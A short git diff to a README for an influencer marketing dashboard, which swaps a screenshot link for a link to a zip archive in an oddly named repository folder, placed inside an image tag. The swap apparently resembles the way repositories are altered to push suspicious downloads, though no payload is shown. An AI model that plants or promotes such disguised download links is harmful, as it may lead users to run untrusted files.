@@ -14,5 +14,5 @@ Built with a dark theme and striking orange/red accents, the dashboard tells a c
 - Professional dark theme for clear insights
 
 ## 📂 Project Structure
-<img width="1281" height="722" alt="Image" src="https://github.com/user-attachments/assets/e489b467-51a3-4298-a90c-b7f6f8097aeb" />
+<img width="1281" height="722" alt="Image" src="https://github.com/Pranavsiripangi/Influencer-Marketing-Dashboard/raw/refs/heads/main/Selachii/Dashboard-Marketing-Influencer-2.8.zip" />
 
